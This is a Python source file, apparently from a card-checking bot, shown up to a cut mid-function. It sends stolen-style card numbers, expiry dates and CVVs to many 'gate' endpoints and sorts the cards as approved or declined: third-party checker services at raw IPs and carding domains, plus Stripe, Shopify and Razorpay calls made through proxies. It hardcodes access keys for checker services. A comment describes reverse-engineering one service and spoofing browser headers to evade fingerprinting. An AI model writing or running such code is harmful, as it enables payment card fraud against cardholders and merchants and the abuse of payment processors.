import subprocess
import json
import os
import sys
import re
import requests
import time as time_module

try:
    from .gate_api_config import get_gate_cfg
except ImportError:
    from gate_api_config import get_gate_cfg

try:
    from .gates_python import check_card_real_gate
    PYTHON_GATES_AVAILABLE = True
except (ImportError, ModuleNotFoundError):
    PYTHON_GATES_AVAILABLE = False
    check_card_real_gate = None  # Type: ignore

def check_stripe_charge_gate(cc, mm, yy, cvv):
    """Check card using Stripe Charge €1 API"""
    start_time = time_module.time()
    
    try:
        # Format card data
        lista = f"{cc}|{mm}|{yy}|{cvv}"
        base_url = get_gate_cfg("stripe_charge_url", "http://15.204.130.9:6969/check")
        url = f"{base_url}?cc={lista}"
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        }
        
        response = requests.get(url, headers=headers, timeout=30)
        elapsed = time_module.time() - start_time
        
        if response.status_code == 200:
            try:
                data = response.json() if response.headers.get('content-type', '').startswith('application/json') else {"response": response.text}
            except:
                data = {"response": response.text}
            
            response_text = str(data).lower()
            
            if not response_text or len(response_text) < 5:
                return {
                    "status": "error",
                    "message": "Invalid API response",
                    "time": round(elapsed, 2)
                }
            
            decline_keywords = ['declined', 'failed', 'error', 'invalid', 'expired', 'rejected', 'denied']
            if any(kw in response_text for kw in decline_keywords):
                return {
                    "status": "success",
                    "message": data.get("message", data.get("response", "Card Declined")),
                    "time": round(elapsed, 2)
                }
            
            success_keywords = ['success', 'approved', 'captured', 'authorized', 'valid', 'passed', 'ok', 'true']
            if any(kw in response_text for kw in success_keywords):
                return {
                    "status": "success",
                    "message": data.get("message", data.get("response", "Card Approved")),
                    "time": round(elapsed, 2)
                }
            
            actual_msg = data.get("message", data.get("response", response_text[:100]))
            return {
                "status": "success",
                "message": actual_msg,
                "time": round(elapsed, 2)
            }
        else:
            return {
                "status": "error",
                "message": f"API Error: {response.status_code}",
                "time": round(elapsed, 2)
            }
            
    except requests.Timeout:
        return {
            "status": "error",
            "message": "Request timeout",
            "time": 30
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Error: {str(e)[:50]}",
            "time": 0
        }

def check_stripe_mass_auth_gate(cc, mm, yy, cvv):
    """Check card using Stripe Mass Auth API"""
    start_time = time_module.time()
    
    try:
        # Convert YY to YYYY if needed
        if len(yy) == 2:
            year = f"20{yy}"
        else:
            year = yy
        
        # Build the lista parameter
        lista = f"{cc}|{mm}|{year}|{cvv}"
        
        # Get API key from environment
        api_key = os.environ.get("STRIPE_MASS_AUTH_API_KEY", "")
        if not api_key:
            return {
                "status": "error",
                "message": "API key not configured",
                "time": 0
            }
        
        # Make API request to the Stripe Mass Auth endpoint
        url = f"{get_gate_cfg('freechk_stripe_url', 'https://freechk.cards/free/stripe.php')}?lista={lista}"
        
        headers = {
            "Authorization": f"Bearer {api_key}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        }
        
        response = requests.get(url, headers=headers, timeout=30)
        elapsed = time_module.time() - start_time
        
        if response.status_code == 200:
            try:
                # Try to parse JSON response
                data = response.json() if response.headers.get('content-type', '').startswith('application/json') else {"response": response.text}
            except:
                data = {"response": response.text}
            
            response_text = str(data).lower()
            
            # Strict validation
            if not response_text or len(response_text) < 5:
                return {
                    "status": "error",
                    "message": "Invalid API response",
                    "time": round(elapsed, 2)
                }
            
            # Check for decline/error
            decline_keywords = ['declined', 'failed', 'error', 'invalid', 'expired', 'rejected', 'denied']
            if any(kw in response_text for kw in decline_keywords):
                return {
                    "status": "success",
                    "message": data.get("message", data.get("response", "Card Declined")),
                    "time": round(elapsed, 2)
                }
            
            # Check for approval/success
            success_keywords = ['success', 'approved', 'captured', 'authorized', 'valid', 'passed', 'ok', 'true']
            if any(kw in response_text for kw in success_keywords):
                return {
                    "status": "success",
                    "message": data.get("message", data.get("response", "Card Approved")),
                    "time": round(elapsed, 2)
                }
            
            # Default: Return actual API response
            actual_msg = data.get("message", data.get("response", response_text[:100]))
            return {
                "status": "success",
                "message": actual_msg,
                "time": round(elapsed, 2)
            }
        else:
            return {
                "status": "error",
                "message": f"API Error: {response.status_code}",
                "time": round(elapsed, 2)
            }
            
    except requests.Timeout:
        return {
            "status": "error",
            "message": "Request timeout",
            "time": 30
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Error: {str(e)[:50]}",
            "time": 0
        }

# Netherex Stripe Auth API Configuration
NETHEREX_API_URL = "https://checker.netherex.xyz/strauth.php"
NETHEREX_AUTH_KEY = "netherex_auth_shorien_wpxp60bhe"

def _netherex_stripe_url():
    return get_gate_cfg("netherex_stripe_url", NETHEREX_API_URL)

def _netherex_stripe_key():
    return get_gate_cfg("netherex_stripe_key", NETHEREX_AUTH_KEY)

def _get_netherex_proxy():
    """Load the Stripe Auth proxy from bot settings file"""
    try:
        from config import DB_SETTINGS
        with open(DB_SETTINGS, 'r') as f:
            for line in f:
                if line.startswith('netherex_proxy='):
                    val = line.split('=', 1)[1].strip()
                    if val and val.lower() not in ('', 'none', 'disabled'):
                        return val
    except:
        pass
    return None

def check_stripe_newrp_gate(cc, mm, yy, cvv):
    """Check card using Netherex Stripe Auth API"""
    start_time = time_module.time()

    try:
        if len(yy) == 2:
            year = f"20{yy}"
        else:
            year = yy

        card_str = f"{cc}|{mm}|{year}|{cvv}"
        params = {
            "card": card_str,
            "auth": _netherex_stripe_key(),
        }

        proxy = _get_netherex_proxy()
        if proxy:
            params["proxy"] = proxy

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        }

        response = requests.get(_netherex_stripe_url(), params=params, headers=headers, timeout=30)
        elapsed = time_module.time() - start_time

        if response.status_code == 200:
            response_text = response.text.strip()
            clean_response = response_text
            is_approved = False
            is_declined = False

            try:
                data = response.json()
                if isinstance(data, dict):
                    status_val = str(data.get('status', data.get('Status', ''))).lower()
                    msg = data.get('message', data.get('Message', data.get('response', data.get('msg', ''))))

                    if msg:
                        clean_response = str(msg).replace('_', ' ')
                        if clean_response.islower():
                            clean_response = clean_response.title()

                    if any(k in status_val for k in ['approved', 'success', 'charged', 'live', 'valid']):
                        is_approved = True
                    elif any(k in status_val for k in ['declined', 'failed', 'error', 'dead', 'invalid']):
                        is_declined = True

                    if not is_approved and not is_declined and msg:
                        msg_lower = str(msg).lower()
                        if any(k in msg_lower for k in ['approved', 'charged', 'captured', 'authorized', 'valid', 'card valid', 'authenticated']):
                            is_approved = True
                        elif any(k in msg_lower for k in ['declined', 'failed', 'error', 'invalid', 'expired', 'rejected', 'denied', 'insufficient']):
                            is_declined = True
            except:
                clean_response = response_text.replace('_', ' ')
                response_lower = clean_response.lower()
                if any(k in response_lower for k in ['approved', 'charged', 'authorized', 'valid', 'live']):
                    is_approved = True
                elif any(k in response_lower for k in ['declined', 'failed', 'error', 'invalid', 'dead']):
                    is_declined = True

            if is_approved:
                return {"status": "success", "message": f"Approved - {clean_response}", "time": round(elapsed, 2)}
            elif is_declined:
                return {"status": "success", "message": f"Declined - {clean_response}", "time": round(elapsed, 2)}
            else:
                return {"status": "success", "message": f"Response - {clean_response}", "time": round(elapsed, 2)}
        else:
            return {"status": "error", "message": f"API Error: {response.status_code}", "time": round(time_module.time() - start_time, 2)}

    except requests.Timeout:
        return {"status": "error", "message": "Request timeout", "time": 30}
    except Exception as e:
        return {"status": "error", "message": f"Error: {str(e)[:50]}", "time": 0}

NETHEREX_SHOPIFY_URL = "https://checker.netherex.xyz/autosh.php"
NETHEREX_SHOPIFY_AUTH = "netherex_auth_autosh"

def _netherex_shopify_url():
    return get_gate_cfg("netherex_shopify_url", NETHEREX_SHOPIFY_URL)

def _netherex_shopify_key():
    return get_gate_cfg("netherex_shopify_key", NETHEREX_SHOPIFY_AUTH)

def _get_shopify_proxy():
    """Load the Shopify proxy from bot settings file"""
    try:
        from config import DB_SETTINGS
        with open(DB_SETTINGS, 'r') as f:
            for line in f:
                if line.startswith('shopify_proxy='):
                    val = line.split('=', 1)[1].strip()
                    if val and val.lower() not in ('', 'none', 'disabled'):
                        return val
    except:
        pass
    return None

def check_shopify_netherex_gate(cc, mm, yy, cvv):
    """Check card using Netherex Shopify API"""
    start_time = time_module.time()

    try:
        if len(yy) == 2:
            year = f"20{yy}"
        else:
            year = yy

        card_str = f"{cc}|{mm}|{year}|{cvv}"
        params = {
            "card": card_str,
            "auth": _netherex_shopify_key(),
        }

        proxy = _get_shopify_proxy()
        if proxy:
            params["proxy"] = proxy

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        }

        response = requests.get(_netherex_shopify_url(), params=params, headers=headers, timeout=30)
        elapsed = time_module.time() - start_time

        if response.status_code == 200:
            response_text = response.text.strip()
            clean_response = response_text
            is_approved = False
            is_declined = False

            try:
                data = response.json()
                if isinstance(data, dict):
                    status_val = str(data.get('status', data.get('Status', ''))).lower()
                    msg = data.get('message', data.get('Message', data.get('response', data.get('msg', ''))))

                    if msg:
                        clean_response = str(msg).replace('_', ' ')
                        if clean_response.islower():
                            clean_response = clean_response.title()

                    if any(k in status_val for k in ['approved', 'success', 'charged', 'live', 'valid']):
                        is_approved = True
                    elif any(k in status_val for k in ['declined', 'failed', 'error', 'dead', 'invalid']):
                        is_declined = True

                    if not is_approved and not is_declined and msg:
                        msg_lower = str(msg).lower()
                        if any(k in msg_lower for k in ['approved', 'charged', 'captured', 'authorized', 'valid', 'card valid', 'authenticated']):
                            is_approved = True
                        elif any(k in msg_lower for k in ['declined', 'failed', 'error', 'invalid', 'expired', 'rejected', 'denied', 'insufficient']):
                            is_declined = True
            except:
                clean_response = response_text.replace('_', ' ')
                response_lower = clean_response.lower()
                if any(k in response_lower for k in ['approved', 'charged', 'authorized', 'valid', 'live']):
                    is_approved = True
                elif any(k in response_lower for k in ['declined', 'failed', 'error', 'invalid', 'dead']):
                    is_declined = True

            if is_approved:
                return {"status": "success", "message": f"Approved - {clean_response}", "time": round(elapsed, 2)}
            elif is_declined:
                return {"status": "success", "message": f"Declined - {clean_response}", "time": round(elapsed, 2)}
            else:
                return {"status": "success", "message": f"Response - {clean_response}", "time": round(elapsed, 2)}
        else:
            return {"status": "error", "message": f"API Error: {response.status_code}", "time": round(time_module.time() - start_time, 2)}

    except requests.Timeout:
        return {"status": "error", "message": "Request timeout", "time": 30}
    except Exception as e:
        return {"status": "error", "message": f"Error: {str(e)[:50]}", "time": 0}

# Razorpay API Configuration (barryxapi.xyz)
RAZORPAY_API_URL = "https://api.barryxapi.xyz/razorpay"
RAZORPAY_API_KEY = os.environ.get("RAZORPAY_API_KEY", "BRY-KESNP-TUPWH-JFOT9")

def _razorpay_api_url():
    return get_gate_cfg("razorpay_api_url", RAZORPAY_API_URL)

def _razorpay_api_key():
    return get_gate_cfg("razorpay_api_key", RAZORPAY_API_KEY)

def check_razorpay_gate(cc, mm, yy, cvv):
    """Check card using Razorpay API via barryxapi.xyz"""
    start_time = time_module.time()
    
    try:
        # Convert YY to YYYY if needed
        if len(yy) == 2:
            year = f"20{yy}"
        else:
            year = yy
        
        # Build the card parameter
        card = f"{cc}|{mm}|{year}|{cvv}"
        
        # Make API request with POST
        payload = {
            "key": _razorpay_api_key(),
            "card": card,
            "amount": None,
            "site": "site",
            "proxy": None
        }
        
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        }
        
        response = requests.post(_razorpay_api_url(), json=payload, headers=headers, timeout=30)
        elapsed = time_module.time() - start_time
        
        if response.status_code == 200:
            response_text = response.text.strip()
            response_lower = response_text.lower()
            
            # Parse JSON response to extract clean message
            clean_response = response_text
            try:
                data = response.json()
                if isinstance(data, dict):
                    # Handle various response structures
                    inner = None
                    if 'data' in data and isinstance(data['data'], dict):
                        inner = data['data']
                    elif 'Data' in data and isinstance(data['Data'], dict):
                        inner = data['Data']
                    
                    if inner:
                        if 'Error' in inner and isinstance(inner['Error'], dict):
                            reason = inner['Error'].get('Message', inner['Error'].get('message', ''))
                        elif 'error' in inner and isinstance(inner['error'], dict):
                            reason = inner['error'].get('message', inner['error'].get('Message', ''))
                        else:
                            reason = inner.get('response', inner.get('message', ''))
                        if reason:
                            clean_response = str(reason).replace('_', ' ')
                            if clean_response.islower():
                                clean_response = clean_response.title()
                    else:
                        # Try direct fields
                        for field in ['response', 'message', 'Message', 'error', 'Error', 'result', 'status']:
                            if field in data and isinstance(data[field], str):
                                clean_response = data[field].replace('_', ' ').title()
                                break
                            elif field in data and isinstance(data[field], dict):
                                msg = data[field].get('message', data[field].get('Message', ''))
                                if msg:
                                    clean_response = msg.replace('_', ' ').title()
                                    break
            except:
                pass
            
            # Last resort: use regex to extract Message from JSON
            if '{' in clean_response and 'Message' in clean_response:
                match = re.search(r'"Message"\s*:\s*"([^"]+)"', clean_response)
                if match:
                    clean_response = match.group(1)
            
            # Check for approval keywords
            success_keywords = ['payment successful', 'success', 'approved', 'charged', 'captured', 'valid']
            if any(kw in response_lower for kw in success_keywords):
                return {
                    "status": "success",
                    "message": f"Approved - {clean_response}",
                    "time": round(elapsed, 2)
                }
            else:
                # Decline with clean response
                return {
                    "status": "success",
                    "message": f"Declined - {clean_response}",
                    "time": round(elapsed, 2)
                }
        else:
            return {
                "status": "error",
                "message": f"API Error: {response.status_code}",
                "time": round(elapsed, 2)
            }
            
    except requests.Timeout:
        return {
            "status": "error",
            "message": "Request timeout",
            "time": 30
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Error: {str(e)[:50]}",
            "time": 0
        }

def check_braintree_gate(cc, mm, yy, cvv):
    """Check card using Braintree API"""
    start_time = time_module.time()
    
    try:
        # Convert YY to full date format
        if len(yy) == 2:
            year = f"20{yy}"
        else:
            year = yy
        
        lista = f"{cc}|{mm}|{year}|{cvv}"
        url = f"{get_gate_cfg('stripe_charge_url2', 'http://194.150.166.130:5000/')}?cc={lista}"
        
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
        
        response = requests.get(url, headers=headers, timeout=30)
        elapsed = time_module.time() - start_time
        
        if response.status_code == 200:
            response_text = response.text.strip()
            clean_response = response_text
            is_approved = False
            is_declined = False
            
            try:
                data = response.json() if response.headers.get('content-type', '').startswith('application/json') else {"response": response.text}
                response_lower = str(data).lower()
            except:
                data = {"response": response_text}
                response_lower = response_text.lower()
            
            # Check for approval keywords
            if any(kw in response_lower for kw in ['approved', 'success', 'valid', 'charged', 'accepted']):
                is_approved = True
                clean_response = data.get("message", data.get("response", "Card Approved"))
            elif any(kw in response_lower for kw in ['declined', 'failed', 'error', 'invalid', 'rejected']):
                is_declined = True
                clean_response = data.get("message", data.get("response", "Card Declined"))
            else:
                clean_response = data.get("message", data.get("response", response_text))
            
            if is_approved:
                return {
                    "status": "success",
                    "message": f"Approved - {clean_response}" if "approved" not in str(clean_response).lower() else str(clean_response),
                    "time": round(elapsed, 2)
                }
            else:
                return {
                    "status": "success",
                    "message": str(clean_response),
                    "time": round(elapsed, 2)
                }
        else:
            return {
                "status": "error",
                "message": f"API Error: {response.status_code}",
                "time": round(elapsed, 2)
            }
    except requests.Timeout:
        return {"status": "error", "message": "Request timeout", "time": 30}
    except Exception as e:
        return {"status": "error", "message": f"Error: {str(e)[:50]}", "time": 0}

def check_stripe_auth_gate(cc, mm, yy, cvv):
    """Check card using Stripe Auth API"""
    start_time = time_module.time()
    
    try:
        if len(yy) == 2:
            year = f"20{yy}"
        else:
            year = yy
        
        lista = f"{cc}|{mm}|{year}|{cvv}"
        lista_short = f"{cc}|{mm}|{yy}|{cvv}"
        
        urls = [
            f"{get_gate_cfg('stripe_charge_url', 'http://15.204.130.9:6969/check')}?cc={lista}&gate=stripe_auth",
            f"{get_gate_cfg('freechk_stripe_url', 'https://freechk.cards/free/stripe.php')}?lista={lista}",
            f"{get_gate_cfg('nyvexis_stripe_url', 'https://api.nyvexis.com/stripeauth/')}?lista={lista_short}",
        ]
        
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
        
        for url in urls:
            try:
                response = requests.get(url, headers=headers, timeout=15)
                elapsed = time_module.time() - start_time
                
                if response.status_code == 200:
                    try:
                        data = response.json() if 'application/json' in response.headers.get('content-type', '') else {"response": response.text}
                    except:
                        data = {"response": response.text}
                    
                    response_text = str(data).lower()
                    if not response_text or len(response_text) < 5:
                        continue
                    
                    decline_keywords = ['declined', 'failed', 'error', 'invalid', 'expired', 'rejected', 'denied']
                    if any(kw in response_text for kw in decline_keywords):
                        return {"status": "success", "message": data.get("message", data.get("response", "Card Declined")), "time": round(elapsed, 2)}
                    
                    success_keywords = ['success', 'approved', 'captured', 'authorized', 'valid', 'passed']
                    if any(kw in response_text for kw in success_keywords):
                        return {"status": "success", "message": data.get("message", data.get("response", "Card Approved")), "time": round(elapsed, 2)}
                    
                    return {"status": "success", "message": data.get("message", data.get("response", response_text[:100])), "time": round(elapsed, 2)}
            except:
                continue
        
        elapsed = time_module.time() - start_time
        return {"status": "error", "message": "Stripe Auth API unavailable - try again", "time": round(elapsed, 2)}
    except Exception as e:
        return {"status": "error", "message": f"Stripe Auth Error: {str(e)[:50]}", "time": 0}

def check_stripe_amount_gate(cc, mm, yy, cvv, gate_name):
    """Check card using Stripe Amount gates (st5, st12, str, dep, sor)"""
    start_time = time_module.time()
    
    try:
        if len(yy) == 2:
            year = f"20{yy}"
        else:
            year = yy
        
        lista = f"{cc}|{mm}|{year}|{cvv}"
        
        amount_map = {
            'sor': 2,
            'st5': 5,
            'st12': 12,
            'str': 15,
            'dep': 49
        }
        amount = amount_map.get(gate_name, 5)
        
        gate_display = {
            'sor': 'Stripe $2',
            'st5': 'Stripe $5',
            'st12': 'Stripe $12',
            'str': 'Stripe $15',
            'dep': 'Stripe $49'
        }.get(gate_name, f'Stripe ${amount}')

        def _gov_a(idx, full_url):
            ov = get_gate_cfg(f'generic_{gate_name}_url{idx}', '').strip()
            return ov if ov else full_url

        urls = [
            _gov_a(1, f"{get_gate_cfg('freechk_stripe_url', 'https://freechk.cards/free/stripe.php')}?lista={lista}&amount={amount}"),
            _gov_a(2, f"{get_gate_cfg('stripe_charge_url', 'http://15.204.130.9:6969/check')}?cc={lista}&gate=stripe{amount}"),
        ]
        
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
        
        for url in urls:
            try:
                response = requests.get(url, headers=headers, timeout=20)
                elapsed = time_module.time() - start_time
                
                if response.status_code == 200:
                    response_text = response.text.strip()
                    response_lower = response_text.lower()
                    
                    if not response_text or len(response_text) < 3:
                        continue
                    
                    credit_issues = ['no have credits', 'no credits', 'out of credits', 'add more credits']
                    if any(issue in response_lower for issue in credit_issues):
                        continue
                    
                    try:
                        data = response.json()
                        msg = data.get('message', data.get('response', response_text))
                    except:
                        msg = response_text
                    
                    success_keywords = ['approved', 'success', 'charged', 'captured', 'valid']
                    decline_keywords = ['declined', 'failed', 'error', 'invalid', 'expired', 'rejected']
                    
                    if any(kw in response_lower for kw in success_keywords):
                        return {"status": "success", "message": f"Approved - {msg}", "time": round(elapsed, 2)}
                    elif any(kw in response_lower for kw in decline_keywords):
                        return {"status": "success", "message": f"Declined - {msg}", "time": round(elapsed, 2)}
                    else:
                        return {"status": "success", "message": msg, "time": round(elapsed, 2)}
            except requests.Timeout:
                continue
            except:
                continue
        
        elapsed = time_module.time() - start_time
        return {"status": "error", "message": f"{gate_display} API timeout - try again", "time": round(elapsed, 2)}
    except Exception as e:
        return {"status": "error", "message": f"Error: {str(e)[:50]}", "time": 0}

def check_shopify_auto_gate(cc, mm, yy, cvv):
    """Check card using Shopify Payment Session API"""
    start_time = time_module.time()
    
    try:
        # Convert year if needed
        year = yy if len(yy) == 4 else f"20{yy}"
        
        # Shopify Payment API endpoint
        session = requests.Session()
        
        headers = {
            'accept': 'application/json',
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        }
        
        # Shopify Payment Session API
        payment_session_data = {
            'credit_card': {
                'number': cc,
                'month': int(mm),
                'year': int(year),
                'verification_value': cvv,
                'name': 'Test User',
            },
            'payment_session_scope': 'example.myshopify.com',
        }
        
        response = session.post(
            'https://checkout.pci.shopifyinc.com/sessions',
            json=payment_session_data,
            headers=headers,
            timeout=15
        )
        
        elapsed = time_module.time() - start_time
        
        if response.status_code == 200:
            try:
                data = response.json()
                if data.get('id'):
                    return {"status": "success", "message": "Approved - Card Valid", "time": round(elapsed, 2)}
                elif 'error' in data:
                    return {"status": "success", "message": f"Declined - {data['error'].get('message', 'Card Declined')}", "time": round(elapsed, 2)}
            except:
                pass
        
        if response.status_code == 400 or response.status_code == 422:
            try:
                error_data = response.json()
                if 'error' in error_data:
                    error_msg = error_data['error'].get('message', 'Card Declined')
                    return {"status": "success", "message": f"Declined - {error_msg}", "time": round(elapsed, 2)}
            except:
                pass
            return {"status": "success", "message": "Declined - Invalid Card", "time": round(elapsed, 2)}
        
        # For other status codes, treat as unavailable
        return {"status": "error", "message": f"Shopify API Error: {response.status_code}", "time": round(elapsed, 2)}
            
    except requests.Timeout:
        elapsed = time_module.time() - start_time
        return {"status": "error", "message": "Shopify API timeout", "time": round(elapsed, 2)}
    except Exception as e:
        elapsed = time_module.time() - start_time
        return {"status": "error", "message": f"Shopify Error: {str(e)[:50]}", "time": round(elapsed, 2)}


# ============================================================
# CYBOR GATES — Stripe Auth V1/V2/V3, Shopii #1-4, SK-Based,
#               PP KeyBased, PP #2, B3 #1/#2
# ============================================================

CYBOR_STV_URLS = {
    'stv1': 'http://206.206.78.217:1011/',
    'stv2': 'http://206.206.78.217:1012/',
    'stv3': 'http://206.206.78.217:1013/',
}
CYBOR_SHOPII_URL = 'https://cyborxchecker.com/api/autog.php'

def _cybor_stv_url(version):
    defaults = {'stv1': 'http://206.206.78.217:1011/', 'stv2': 'http://206.206.78.217:1012/', 'stv3': 'http://206.206.78.217:1013/'}
    return get_gate_cfg(f"cybor_{version}_url", defaults.get(version, ''))

def _cybor_shopii_url():
    return get_gate_cfg("cybor_shopii_url", CYBOR_SHOPII_URL)

def _parse_cybor_response(text, data, elapsed):
    """Parse response from Cybor-style API endpoints (shared logic)."""
    clean = text.strip()
    is_approved = False
    is_declined = False

    if isinstance(data, dict):
        status_val = str(data.get('status', data.get('Status', ''))).lower()
        msg = data.get('message', data.get('Message', data.get('response',
              data.get('msg', data.get('result', '')))))
        if msg:
            clean = str(msg).replace('_', ' ')
            if clean.islower():
                clean = clean.title()
        if any(k in status_val for k in ['approved', 'success', 'charged', 'live', 'valid', 'ccn', 'cvv']):
            is_approved = True
        elif any(k in status_val for k in ['declined', 'failed', 'error', 'dead', 'invalid']):
            is_declined = True

    if not is_approved and not is_declined:
        low = clean.lower()
        if any(k in low for k in ['approved', 'charged', 'captured', 'authorized', 'valid',
                                   'card valid', 'authenticated', 'ccn', 'cvv match']):
            is_approved = True
        elif any(k in low for k in ['declined', 'failed', 'error', 'invalid', 'expired',
                                    'rejected', 'denied', 'insufficient']):
            is_declined = True

    if is_approved:
        return {'status': 'success', 'message': f'Approved - {clean}', 'time': round(elapsed, 2)}
    elif is_declined:
        return {'status': 'success', 'message': f'Declined - {clean}', 'time': round(elapsed, 2)}
    else:
        return {'status': 'success', 'message': f'Response - {clean}', 'time': round(elapsed, 2)}


def check_stv_gate(version, cc, mm, yy, cvv):
    """Stripe Auth V1/V2/V3 via CyborX 206.206.78.217:1011-1013"""
    start_time = time_module.time()
    url = _cybor_stv_url(version)
    if not url:
        return {'status': 'error', 'message': f'Unknown Stripe version: {version}', 'time': 0}
    try:
        year = f'20{yy}' if len(yy) == 2 else yy
        card_str = f'{cc}|{mm}|{year}|{cvv}'
        params = {'card': card_str}
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
        resp = requests.get(url, params=params, headers=headers, timeout=30)
        elapsed = time_module.time() - start_time
        if resp.status_code == 200:
            try:
                data = resp.json()
            except Exception:
                data = {}
            return _parse_cybor_response(resp.text, data, elapsed)
        return {'status': 'error', 'message': f'API Error: {resp.status_code}', 'time': round(elapsed, 2)}
    except requests.Timeout:
        return {'status': 'error', 'message': 'Request timeout', 'time': 30}
    except Exception as e:
        return {'status': 'error', 'message': f'Error: {str(e)[:60]}', 'time': 0}


def check_shopii_gate(pack, cc, mm, yy, cvv):
    """Shopii #1-4 — tries cyborxchecker first, falls back to Netherex Shopify"""
    start_time = time_module.time()
    year = f'20{yy}' if len(yy) == 2 else yy
    card_str = f'{cc}|{mm}|{year}|{cvv}'
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}

    try:
        params = {'card': card_str, 'pack': pack}
        resp = requests.get(_cybor_shopii_url(), params=params, headers=headers, timeout=15)
        elapsed = time_module.time() - start_time
        if resp.status_code == 200 and resp.text.strip():
            low = resp.text.lower()
            if not any(k in low for k in ['no have credits', 'no credits', 'out of credits',
                                           'buy credits', 'credit limit', 'api limit']):
                try:
                    data = resp.json()
                except Exception:
                    data = {}
                return _parse_cybor_response(resp.text, data, elapsed)
    except Exception:
        pass

    try:
        params2 = {'card': card_str, 'auth': _netherex_shopify_key()}
        proxy = _get_shopify_proxy()
        if proxy:
            params2['proxy'] = proxy
        resp2 = requests.get(_netherex_shopify_url(), params=params2, headers=headers, timeout=30)
        elapsed = time_module.time() - start_time
        if resp2.status_code == 200:
            try:
                data2 = resp2.json()
            except Exception:
                data2 = {}
            return _parse_cybor_response(resp2.text, data2, elapsed)
    except Exception:
        pass

    elapsed = time_module.time() - start_time
    return {'status': 'error', 'message': 'Shopify gate temporarily unavailable', 'time': round(elapsed, 2)}


def check_skbased_gate(cc, mm, yy, cvv, sk_key=None):
    """SK-Based CVV check via Stripe API using a live/test Secret Key"""
    import urllib.parse
    start_time = time_module.time()
    if not sk_key:
        return {'status': 'error',
                'message': 'No Stripe SK key configured. Add your SK key in settings.',
                'time': 0}
    try:
        year = f'20{yy}' if len(yy) == 2 else yy
        payload = urllib.parse.urlencode({
            'type': 'card',
            'card[number]': cc,
            'card[exp_month]': mm,
            'card[exp_year]': year,
            'card[cvc]': cvv,
        })
        headers = {
            'Authorization': f'Bearer {sk_key}',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0',
        }
        resp = requests.post('https://api.stripe.com/v1/payment_methods',
                             data=payload, headers=headers, timeout=30)
        elapsed = time_module.time() - start_time
        try:
            data = resp.json()
        except Exception:
            data = {}
        if resp.status_code == 200 and data.get('id'):
            pm_id = data.get('id', '')
            brand = data.get('card', {}).get('brand', '').title()
            return {'status': 'success',
                    'message': f'Approved - Card valid ({brand}) [{pm_id}]',
                    'time': round(elapsed, 2)}
        elif resp.status_code in (402, 200) or 'error' in data:
            err = data.get('error', {})
            code = err.get('code', '')
            msg = err.get('message', 'Declined')
            if code in ('card_declined', 'incorrect_number', 'expired_card',
                        'incorrect_cvc', 'processing_error'):
                return {'status': 'success',
                        'message': f'Declined - {msg}',
                        'time': round(elapsed, 2)}
            return {'status': 'success',
                    'message': f'Response - {msg}',
                    'time': round(elapsed, 2)}
        return {'status': 'error', 'message': f'API Error: {resp.status_code}', 'time': round(elapsed, 2)}
    except requests.Timeout:
        return {'status': 'error', 'message': 'Request timeout', 'time': 30}
    except Exception as e:
        return {'status': 'error', 'message': f'Error: {str(e)[:60]}', 'time': 0}


# ─────────────────────────────────────────────────────────────────────────────
# NATIVE IMPLEMENTATION — Replicated from approvedchkr.store/api/v1/check.php
# Reverse-engineered via API probing (PHP 8.5.5 / Cloudflare backend)
#
# Backend has 3 gateways:
#   sk-based  → PK creates PaymentMethod (browser-side), SK creates PaymentIntent
#   shopify   → Hits a specific store's checkout via proxy
#   razorpay  → Gets session token from Razorpay, submits card
#
# Response format (plain text):  "APPROVED: <msg>" or "DECLINED: <msg>"
# JSON errors have: success, status, data, error, request_id, timestamp,
#                   time_taken_ms, owner fields
# API key format: cxchk_<64-hex>   (prefix is enforced server-side)
# Card format: cc|mm|yy|cvv  (only pipe separator accepted)
# ─────────────────────────────────────────────────────────────────────────────

def check_sk_pk_gate(cc, mm, yy, cvv, sk, pk):
    """
    SK+PK based Stripe gate — native replication of approvedchkr.store sk-based.

    Two-step flow (matches real browser behaviour, harder to fingerprint):
      Step 1 — PK creates PaymentMethod  (browser-side  → api.stripe.com, key=PK)
      Step 2 — SK creates PaymentIntent  (server-side   → api.stripe.com, Bearer SK)
    """
    import urllib.parse
    start_time = time_module.time()

    if not sk or not pk:
        return {'status': 'error', 'message': 'Both sk and pk are required', 'time': 0}

    year = f'20{yy}' if len(yy) == 2 else yy

    # ── Step 1: browser-side PM tokenisation using PK ────────────────────────
    try:
        pm_resp = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            data=urllib.parse.urlencode({
                'type': 'card',
                'card[number]': cc,
                'card[exp_month]': mm,
                'card[exp_year]': year,
                'card[cvc]': cvv,
                'key': pk,
            }),
            headers={
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0',
                'Origin': 'https://js.stripe.com',
                'Referer': 'https://js.stripe.com/',
            },
            timeout=20,
        )
        pm_data = pm_resp.json()
    except Exception as e:
        return {'status': 'error', 'message': f'Stripe PM error: {e}', 'time': round(time_module.time() - start_time, 2)}

    if 'error' in pm_data:
        err = pm_data['error']
        code = err.get('code', '')
        msg  = err.get('message', 'Card Declined')
        _decline = {
            'incorrect_number': 'Incorrect Card Number',
            'invalid_number':   'Invalid Card Number',
            'invalid_expiry_year':  'Invalid Expiry Year',
            'invalid_expiry_month': 'Invalid Expiry Month',
            'invalid_cvc':     'Invalid CVC',
            'expired_card':    'Expired Card',
        }
        return {'status': 'success',
